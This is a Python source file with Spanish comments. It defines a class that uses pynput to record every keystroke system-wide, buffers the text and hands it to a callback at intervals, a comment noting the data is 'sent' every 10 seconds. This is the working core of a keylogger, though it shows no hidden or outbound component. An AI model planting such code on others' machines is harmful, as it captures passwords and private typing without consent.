from pynput import keyboard
import time
from threading import Thread

class KeyMonitor:
    def __init__(self, callback):
        """
        :param callback: Función a llamar cuando se detectan teclas.
                         Debe aceptar una lista de strings.
        """
        self.callback = callback
        self.buffer = []
        self.is_running = False
        self.last_flush = time.time()
        self.flush_interval = 10  # Enviar datos cada 10 segundos si hay actividad
        
    def start(self):
        self.is_running = True
        # Iniciamos el listener en un hilo no bloqueante
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        
        # Iniciamos un hilo para vaciar el buffer periódicamente
        self.flush_thread = Thread(target=self._periodic_flush)
        self.flush_thread.daemon = True
        self.flush_thread.start()
        print("[KeyMonitor] Iniciado.")

    def stop(self):
        self.is_running = False
        if self.listener:
            self.listener.stop()
        print("[KeyMonitor] Detenido.")

    def _on_press(self, key):
        try:
            # Intentamos obtener el caracter
            char = key.char
            if char is None:
                # Es una tecla especial pero tenemos su char attribute como None
                # A veces pasa con teclas muertas
                return
        except AttributeError:
            # Teclas especiales (Enter, Space, Esc, etc.)
            if key == keyboard.Key.space:
                char = " [SPACE] "
            elif key == keyboard.Key.enter:
                char = " [ENTER]\n"
            elif key == keyboard.Key.tab:
                char = " [TAB] "
            elif key == keyboard.Key.backspace:
                char = " [BACKSPACE] "
            else:
                char = f" [{str(key).replace('Key.', '')}] "
        
        self.buffer.append(char)
        
        # Si el buffer es muy grande, forzamos un guardado
        if len(self.buffer) >= 50:
            self._flush()

    def _periodic_flush(self):
        while self.is_running:
            time.sleep(1)
            if time.time() - self.last_flush > self.flush_interval:
                self._flush()

    def _flush(self):
        if self.buffer:
            data = "".join(self.buffer)
            self.buffer = []
            self.last_flush = time.time()
            self.callback(data)
